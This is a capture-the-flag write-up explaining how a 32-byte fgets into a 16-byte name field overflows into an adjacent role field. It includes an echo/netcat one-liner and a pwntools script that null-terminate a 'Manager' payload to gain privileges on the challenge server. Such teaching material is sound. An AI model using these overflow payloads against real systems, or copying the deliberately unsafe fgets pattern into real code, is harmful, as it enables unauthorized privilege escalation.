# Writeup

## Solution

We can see that we need to buy and then use the item "Flag" to win.
However, the flag has `amount_left` set to 0, therefore we need to refill
that item before being able to buy it again. But we can't to that, since
our role is not set to "Manager", it is "Customer".

We can do that, because there is a buffer overflow in reading the customers name.

The User struct is capable of holding 16 bytes for the `user.name` field.
However, the program reads up to 32 bytes into the `user.name` field.
Thefore, the program reads in the remaining 16 bytes into the memory directly
following the `user.name` buffer, causing a **buffer overflow**.

```c
struct User {
  char name[16];
  char role[16];
  struct Item *inventory[INV_SIZE]; // Array to hold pointers to bought items
};

// [...]
puts("Whats your name?");
printf("> ");
fgets(user.name, 32, stdin);
```

Since memory in a struct is laid out in memory exactly as it is declared in the struct,
the `user.role` buffer will reside directly after the `user.name`.
This means, that we can overwrite the `user.role` field with the buffer overflow.

One last thing which we might stumble upon, is that a trivial buffer overflow which we are
performing by simply typing 16 times A followed by "Manager" into our keyboard, will fail.

We can debug that with the fourth option `4. Show my role` which prints the role while
escaping special characters. Using that we might discover that our actual role is `Manager\n` since
the function `fgets`, which read our input, consumed the newline from hitting "Enter" on our keyboard.

This and more information about `fgets` can be found in the so-called "Manual Pages" (short: Man page) of
the library function. In Linux distributions, they usually can be accessed using `man fgets` in a shell.
Otherwise you can look them up on the internet.

Lets cover the basics on what a string in a C program even is. A string is nothing more than
a sequence of bytes which end on a null byte, whereas the null byte is simply the byte with value 0.
Therefore, we say "Strings are null-terminated in C".

To sucessfully perform the buffer overflow, we can provide the string terminating null byte ourselves.
This can be done using a python script or by using a commandline program such as `echo`.

## Solve Script

### Using commandline tool `echo`:

```shell
(echo -e "AAAAAAAAAAAAAAAAManager\x00\n" ; cat) | nc challenges.sshuzl.de 12379
```

`-e` instructs bash to enable backslash escaping, allowing us to use special characters as newline "\n" or the null byte "\x00".

Appending `; cat` forces the shell to continue reading bytes from the terminal and sends them to netcat.
This keeps the connection open, enabling us to enter more bytes.

### Python solve script

```python
import pwn

def refill_flag():
    # refill items
    io.sendline(b"3")
    # refill flag
    io.sendline(b"3")

def buy_flag():
    # buy item
    io.sendline(b"1")
    # buy flag
    io.sendline(b"3")

def use_flag():
    # use item
    io.sendline(b"2")
    # use first item in inventory, this is the flag
    io.sendline(b"0")

io = pwn.remote("challenges.sshuzl.de", 12379)
# io = pwn.process("./grocery_store")

### Exploit

# 16 bytes padding, then overwrite `user.role` field.
# Note that we manually null terminate the buffer
# since otherwise `fgets` would've read the newline.
io.sendline(b"A" * 16 + b"Manager\x00")

refill_flag()

buy_flag()

use_flag()

# leave connection open
io.interactive()
```
